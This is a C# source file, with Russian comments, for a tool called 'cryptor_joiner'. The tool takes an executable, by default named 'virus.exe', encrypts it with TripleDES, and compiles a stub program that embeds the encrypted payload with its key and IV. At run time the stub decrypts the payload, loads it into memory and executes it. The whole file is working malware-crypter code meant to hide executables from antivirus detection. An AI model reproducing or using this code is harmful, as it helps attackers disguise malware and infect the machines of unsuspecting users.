using System;
using System.Collections;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.CodeDom.Compiler;
using System.Globalization;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Reflection;

namespace cryptor_joiner
{
    class main
    {
        //String dC ="using System;\nusing System.IO; \nusing System.Collections.Generic; \nusing System.Linq;                               \nusing System.Text; \nusing System.Threading.Tasks; \nusing System.Security.Cryptography;                               \nnamespace decryptor \n{ \nclass Program \n{ \nstatic String TripleDES_Decrypt(Byte[] input,                            Byte[] key, Byte [] IV){ \nConsole.WriteLine(\"D:Start\"); \nMemoryStream outStream = new                                MemoryStream(input); \nCryptoStream cStream = new CryptoStream(outStream, new                                            TripleDESCryptoServiceProvider().CreateDecryptor(key, IV), CryptoStreamMode.Read);                                       \nConsole.WriteLine(\"D: Streams created\"); \nByte[] fromEncrypt = new Byte[input.Length];                              \nConsole.WriteLine(\"D: Before read\"); \ncStream.Read(fromEncrypt, 0, fromEncrypt.Length);                             \nConsole.WriteLine(\"D: before closing streams\"); \noutStream.Close(); \nConsole.WriteLine                             (\"D: before return\"); \nreturn new ASCIIEncoding().GetString(fromEncrypt); \n} \nstatic void                           Main(string[] args) \n{ \ntry \n{Int32 initlength = "+ /*_____!!!!INITLENGTH!!!!____*/  ";                               \n" + "Byte[] key = new ASCIIEncoding().GetBytes(\"" + /*"____!!!!STRINGED_KEY!!!!____"*/  "\");" + "                    \nByte[]IV = new ASCIIEncoding().GetBytes(\"" + /*"____!!!!STRINGED_IV!!!!____"*/  "\"); \n" + "Byte[]                   encrypted= new ASCIIEncoding().GetBytes(\"" + /*"____!!!!ENCODED_DATA!!!!____"*/  "\"); \nString                         decrypted =TripleDES_Decrypt(encrypted, key, IV); \nConsole.WriteLine(\"Decrypted text:\");                              \nConsole.WriteLine(decrypted.Substring(0,initlength)); \nConsole.ReadKey(); \n} \ncatch                                 (Exception ex) \n{ \nConsole.WriteLine(ex.Message); \n} \n} \n} \n}";
       
        public static bool compileExecutable(String [] sourceText, String pathOut)
        {
            //FileInfo sourceFile = new FileInfo(sourceName);
            CodeDomProvider provider = null;
            bool compileOK = false;
            //if (sourceFile.Extension.ToUpper(CultureInfo.InvariantCulture) == ".CS")
            //{
                provider = CodeDomProvider.CreateProvider("CSharp");
            //}
            //else
            //{
            //    Console.WriteLine("Source file must have a .cs extension");
            //}
            if (provider != null)
            {
                //String exeName = String.Format(@"{0}\{1}.exe", System.Environment.CurrentDirectory, /*sourceFile.Name.Replace(".", "_")*/ "Decryptor");
                CompilerParameters cp = new CompilerParameters();
                cp.GenerateExecutable = true;
                cp.OutputAssembly = pathOut;
                cp.GenerateInMemory = true; //??
                cp.TreatWarningsAsErrors = false;
                CompilerResults cr = provider.CompileAssemblyFromSource(cp, sourceText);
                if (cr.Errors.Count > 0)
                {
                    Console.WriteLine("Errors building {0} into {1}",
               "String array source" /*sourceName*/, cr.PathToAssembly);
                    foreach (CompilerError ce in cr.Errors)
                    {
                        Console.WriteLine("  {0}", ce.ToString());
                        Console.WriteLine();
                    }
                }
                else
                {
                    Console.WriteLine("Source {0} built into {1} successfully.", "String array source"/*sourceName*/, cr.PathToAssembly);
                }
                if (cr.Errors.Count > 0)
                {
                    compileOK = false;
                }
                else
                {
                    compileOK = true;
                }
            }
            return compileOK;
        }
        
        static void Main(string[] args)
        {
            
              
            
            try
            {
                // Ввод значений аргументов по умолчанию
                Hashtable argsValue = new Hashtable();
                argsValue.Add(@"/\?", null);
                argsValue.Add(@"\A/fv:", @"virus.exe");
                argsValue.Add(@"\A/fd:", @"no");
                argsValue.Add(@"\A/fc:", @"crypted.exe");
                // Разбор аргументов
                argsParse(args, 0, 3, ref argsValue);
                // Использование аргументов
                //if ((String)argsValue[@"/\?"] == "/?") { helpCmd(); return; }
                String path = (String)argsValue[@"\A/fv:"];
                Console.WriteLine("Запускаем программу");
                if (File.Exists(path))
                {
                    Console.WriteLine("Открываем файл {0}...", path);
                    Byte[] bytes;
                    Console.WriteLine("Считываем файл...");
                    bytes = File.ReadAllBytes(path);



                    Int32 keyLength = 192;
                    TripleDESCryptoServiceProvider sample = new TripleDESCryptoServiceProvider();
                    sample.KeySize = keyLength;
                    Byte[] key = sample.Key;
                    Byte[] IV = sample.IV;
                    Byte[] encrypted = Cryptools.TripleDES_Encrypt(bytes, key, IV);
                    String[] toExe = new String[1];
                    toExe[0] = "using System;"+
                        "using System.IO;"+
                        "using System.Collections.Generic; "+
                        "using System.Reflection;" +
                        "using System.Text;"+
                        "using System.Threading.Tasks; "+
                        "using System.Security.Cryptography;"+
                        "namespace decryptor"+
                        "{ "+
                        "class Program "+
                        "{ "+
                        "static Byte [] TripleDES_Decrypt(Byte[] input, Byte[] key, Byte [] IV)"+
                        "{"+
                        " Console.WriteLine(\"D:Start\");"+
                        " MemoryStream outStream = new MemoryStream(input);"+
                        " CryptoStream cStream = new CryptoStream(outStream, new                                              TripleDESCryptoServiceProvider().CreateDecryptor(key, IV), CryptoStreamMode.Read); "+
                        " Console.WriteLine(\"D: Streams created\");"+
                        " Byte[] fromEncrypt = new Byte[input.Length];"+
                        " Console.WriteLine(\"D: Before read\"); "+
                        " cStream.Read(fromEncrypt, 0, fromEncrypt.Length); "+
                        " Console.WriteLine(\"D: before closing streams\");"+
                        " outStream.Close();"+
                        " Console.WriteLine(\"D: before return\");"+
                        " return fromEncrypt; "+
                        "} "+
                        "static void Main(string[] args) "+
                        "{ "+
                        " try "+
                        " {"+
                        "  Int32 initlength = " + bytes.Length.ToString("D") + "; " + 
                        "  Byte[] key = Convert.FromBase64String(\"" + (Convert.ToBase64String(key)) + "\");" + 
                        "  Byte[]IV = Convert.FromBase64String(\"" + (Convert.ToBase64String(IV)) + "\"); " +
                        "  String outPath=\"" + (String)argsValue[@"\A/fd:"] + "\"; " +
                        "  Byte[] encrypted= Convert.FromBase64String(\"" + (Convert.ToBase64String(encrypted)) + "\");"+
                        "  Byte [] decrypted =TripleDES_Decrypt(encrypted, key, IV);"+
                        "  Byte [] readyToWrite = new Byte [initlength];"+
                        "  Array.Copy(decrypted, readyToWrite, initlength);"+
                        "  if((outPath!=\"no\")&&(outPath!=\"yes\"))" +
                        "   File.WriteAllBytes( outPath, readyToWrite);"+
                        "  else if (outPath==\"yes\")" +
                        "   File.WriteAllBytes( \"d_virus.exe\", readyToWrite);" +
                        "  Assembly a = Assembly.Load(readyToWrite);" +
                        "  object o = a.CreateInstance(a.EntryPoint.Name);" +
                        "  a.EntryPoint.Invoke(o, new String [1]);" +
                        "  Console.ReadKey();"+
                        " } "+
                        " catch (Exception ex)"+
                        " {"+
                        "  Console.WriteLine(ex.Message);"+
                        " } "+
                        "}"+
                        "}"+
                        "}";

                    compileExecutable(toExe, (String)argsValue[@"\A/fc:"]);
                }
                else
                {
                    throw new Exception("File for crypting not found");
                }
                //String initial = "Very-very simple sample string!";
                
                Console.ReadKey();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.ReadKey();
            }
        }

        static void errorCmdArgs()
        {
            Console.WriteLine("ИСПОЛЬЗОВАНИЕ:\n\tcryptor-joiner.exe /?\n\tcryptor-joiner.exe [/fv:[путь]имя_файла] [/fd:[путь]имя_файла] [/fc:[путь]имя_файла]\n");
        }

        public static void argsParse(string[] args, int minNumberArgs, int maxNumberArgs, ref Hashtable argsValue)
        {
            // Количество аргументов больше максимального и меньше минимального
            if ((args.Length < minNumberArgs) || (args.Length > maxNumberArgs))
            {
                errorCmdArgs(); throw new ArgumentException("Непредусмотренное количество аргументов");
            }
            // Создание хэш-таблицы значений аргументов
            argsToHashtable(args, ref argsValue);
            // Проверка на один аргумент
            // Паттерн "/?" -> значение
            if (argsValue[@"/\?"] != null)
            {
                if (args.Length == 1) { argsValue[@"/\?"] = "/?"; return; }
                else { errorCmdArgs(); throw new ArgumentException("Неверный(ые) аргумент(ы)"); }
            }
            foreach (string ptrn in argsValue.Keys)
            {
                if (ptrn != @"/\?")
                {
                    if (argsValue[ptrn] == null) { errorCmdArgs(); throw new ArgumentException("Отсутствует(ют) обязательный(ые) аргумент(ы)"); }
                }
            }
        }

        public static void argsToHashtable(string[] args, ref Hashtable argsValue)
        {
            if (args.Length == 0) return;
            bool[] argsKnow = new bool[args.Length];
            for (int i = 0; i < argsKnow.Length; i++) { argsKnow[i] = false; }
            string[] keys = new string[argsValue.Count];
            int k = 0;
            foreach (string key in argsValue.Keys) { keys[k] = key; k++; }
            for (int ikey = 0; ikey < keys.Length; ikey++)
            //foreach (string ptrn in keys)
            {
                string ptrn = keys[ikey];
                if (args.Length != 0)
                {
                    for (int i = 0; i < args.Length; i++)
                    {
                        if (Regex.IsMatch(args[i], ptrn))
                        {
                            argsValue[ptrn] = Regex.Replace(args[i], ptrn, "");
                            argsKnow[i] = true;
                        }
                    }
                }
            }
            if (Array.IndexOf(argsKnow, false) >= 0) { throw new ArgumentException("Aргумент " + (Array.IndexOf(argsKnow, false) + 1) + " не опознан"); }
            return;
        }
    }
}
